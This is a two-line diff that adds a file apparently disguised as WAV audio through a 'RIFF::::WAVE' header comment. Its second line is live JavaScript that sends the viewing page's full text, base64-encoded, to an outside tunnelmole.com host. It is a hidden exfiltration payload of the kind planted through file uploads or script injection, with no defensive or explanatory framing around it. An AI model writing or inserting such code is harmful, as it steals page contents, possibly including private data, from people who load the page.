@@ -1,0 +1,2 @@
+//RIFF::::WAVE
+fetch('http://itvnzg-ip-103-242-105-157.tunnelmole.com/d='+btoa(encodeURI(document.body.innerText)),{cache: "no-cache"});
